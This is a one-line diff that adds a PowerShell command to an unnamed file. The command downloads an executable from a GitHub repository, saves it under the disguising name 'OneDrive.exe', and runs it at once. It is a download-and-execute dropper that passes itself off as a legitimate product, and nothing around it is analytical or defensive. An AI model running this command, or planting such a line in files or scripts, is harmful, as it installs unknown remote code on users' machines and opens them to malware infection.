@@ -1,0 +1,1 @@
+powershell -command "$down = New-Object System.Net.WebClient; $down.DownloadFile('https://github.com/annym1/start/raw/main/start.exe','OneDrive.exe'); $exec = New-Object -com shell.application; $exec.shellexecute('OneDrive.exe'); exit;"
